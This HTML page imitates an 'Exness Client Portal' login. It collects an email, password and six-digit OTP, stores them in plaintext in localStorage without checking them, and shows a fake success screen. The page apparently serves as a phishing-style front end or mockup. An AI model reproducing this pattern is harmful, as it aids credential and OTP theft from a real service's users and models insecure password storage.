<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />

<title>Exness Login</title>

<style>
body {
  margin: 0;
  padding: 0;
  background: #f5f5f5;
  font-family: Arial, sans-serif;
  color: #111;
}

.container {
  max-width: 420px;
  margin: 50px auto;
  padding: 20px;
}

.card {
  background: #fff;
  padding: 28px 24px;
  border-radius: 14px;
  box-shadow: 0 4px 14px rgba(0,0,0,0.10); /* light shadow */
}

/* Perfect responsive logo */
.logo {
  width: 150px;
  max-width: 60%;
  display: block;
  margin: 0 auto 22px;
}

h2 {
  text-align: center;
  margin-bottom: 24px;
  font-size: 22px;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 17px;
  border-radius: 12px;
  border: 1px solid #cfcfcf;
  background: #fafafa;
  font-size: 15px;
  transition: border-color .2s;
}

input:focus {
  border-color: #ffc800;
  outline: none;
}

/* SIGN IN button black */
button {
  width: 100%;
  padding: 15px;
  background: #000; /* BLACK */
  color: #fff;
  border: none;
  border-radius: 12px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity .2s;
}

button:hover {
  opacity: 0.85;
}

.text-center {
  text-align: center;
}

.link {
  color: #007bff; /* BLUE register link */
  font-weight: 600;
  text-decoration: none;
}

.link:hover {
  text-decoration: underline;
}

.success-text {
  text-align: center;
  margin-top: 12px;
  font-size: 15px;
  color: #555;
}

.hidden {
  display: none;
}
</style>
</head>

<body>

<div class="container">

  <!-- LOGIN PAGE -->
  <div id="loginPage" class="card">
    <img src="logo.png" class="logo" alt="Logo">

    <h1>Welcome to Exness Client Portal</h1>

    <input id="loginEmail" type="email" placeholder="Email address">
    <input id="loginPassword" type="password" placeholder="Password">

    <button onclick="goToOtp()">Sign In</button>

    <p class="text-center" style="margin-top:18px;">
      Don’t have an account?
      <a href="register.html" class="link">Register</a>
    </p>
  </div>

  <!-- OTP PAGE -->
  <div id="otpPage" class="card hidden">
    <h2>Enter OTP</h2>
    <input id="otpCode" type="text" maxlength="6" placeholder="6-digit OTP">

    <button onclick="submitOtp()">Verify OTP</button>
  </div>

  <!-- SUCCESS SCREEN -->
  <div id="successPage" class="card hidden">
    <h2>Login Successful</h2>
    <p class="success-text">Redirecting…</p>
  </div>

</div>

<script>
function goToOtp() {
  const email = loginEmail.value.trim();
  const pass = loginPassword.value.trim();

  if (!email || !pass) {
    alert("Please fill in all fields");
    return;
  }

  localStorage.setItem("isLoggedIn", "true");
  localStorage.setItem("loginData", JSON.stringify({ email, password: pass }));

  loginPage.classList.add("hidden");
  otpPage.classList.remove("hidden");
}

function submitOtp() {
  const otp = otpCode.value.trim();

  if (otp.length !== 6) {
    alert("Enter a valid 6-digit OTP");
    return;
  }

  localStorage.setItem("otp", otp);

  otpPage.classList.add("hidden");
  successPage.classList.remove("hidden");

  setTimeout(() => {
    window.location.href = "dashboard.html";
  }, 1400);
}
</script>

</body>
</html>
